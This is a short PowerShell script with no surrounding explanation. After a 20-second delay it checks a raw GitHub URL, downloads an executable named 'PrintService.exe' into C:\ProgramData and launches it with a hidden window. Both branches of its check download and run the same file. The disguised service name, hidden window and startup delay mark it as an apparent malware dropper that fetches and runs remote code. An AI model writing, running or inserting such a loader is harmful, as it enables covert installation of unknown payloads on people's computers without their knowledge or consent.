Start-Sleep -Seconds 20

# Set the TLS protocol version
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Set the URLs and file paths
$url_text = 'https://raw.githubusercontent.com/emyenglish/log/main/update.txt'
$url_exe = 'https://github.com/emyenglish/log/raw/main/PrintService.exe'
$file_exe = "C:\ProgramData\PrintService.exe"

# Function to download the file
function DownloadFile($url, $path) {
    try {
        $down = New-Object System.Net.WebClient
        $down.DownloadFile($url, $path)
        return $true
    }
    catch {
        Write-Host "Error downloading the file: $_.Exception.Message"
        return $false
    }
}

# Check if the URL exists
$response = Invoke-WebRequest -Uri $url_text -UseBasicParsing
if ($response.StatusCode -eq 200) {
    Write-Host "The URL '$url_text' exists."
    
    # Delete the file if it exists
    if (Test-Path $file_exe) {
        Remove-Item -Path $file_exe -Force
        Write-Host "Deleted existing file: $file_exe"
    }
    
    # Download the exe file
    if (DownloadFile $url_exe $file_exe) {
        # Run the exe file
        Start-Process -FilePath $file_exe -WindowStyle Hidden
    }
} else {
    Write-Host "The URL '$url_text' does not exist. Running the existing exe file."
    
    # Download the exe file
    if (DownloadFile $url_exe $file_exe) {
        # Run the exe file
        Start-Process -FilePath $file_exe -WindowStyle Hidden
    }
}

# Exit the script
exit
